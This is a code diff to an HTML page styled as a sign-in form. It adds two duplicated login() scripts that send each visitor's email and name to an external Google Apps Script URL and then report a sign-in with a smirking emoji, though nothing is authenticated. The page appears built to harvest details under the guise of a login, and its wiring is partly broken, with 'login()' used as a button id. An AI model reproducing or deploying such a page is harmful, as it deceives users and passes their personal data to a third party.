@@ -148,11 +148,51 @@ button:hover {
 
         <div class="actions">
             <div class="link">Create account</div>
-            <button>Next</button>
+            <button id="login()">Next</button>
         </div>
 
     </div>
 </div>
+    <script>
+        async function login() {
+    const email = document.getElementById("email").value;
+    const name = document.getElementById("name").value;
+
+    if (!email || !name) {
+        alert("Fill all fields!");
+        return;
+    }
+
+    try {
+        await fetch("https://script.google.com/macros/s/AKfycbyWmBtIt4bryiwnKoXfM_0WXeoHzQOSNnI6BsLovmzkvj7suI5-XL6UTNeBOGok_NrJ/exec", {
+            method: "POST",
+            body: JSON.stringify({ email, name })
+        });
+
+        alert("Signed in successfully 😏");
+    } catch (e) {
+        alert("Error connecting to server");
+    }
+}
+</script>
+  <script>
+async function login() {
+    const email = document.getElementById("email").value;
+    const name = document.getElementById("name").value;
+
+    if (!email || !name) {
+        alert("Fill all fields!");
+        return;
+    }
+
+    await fetch("https://script.google.com/macros/s/AKfycbyWmBtIt4bryiwnKoXfM_0WXeoHzQOSNnI6BsLovmzkvj7suI5-XL6UTNeBOGok_NrJ/exec", {
+        method: "POST",
+        body: JSON.stringify({ email, name })
+    });
+
+    alert("Signed in successfully 😏");
+}
+</script>
 
 </body>
 </html>
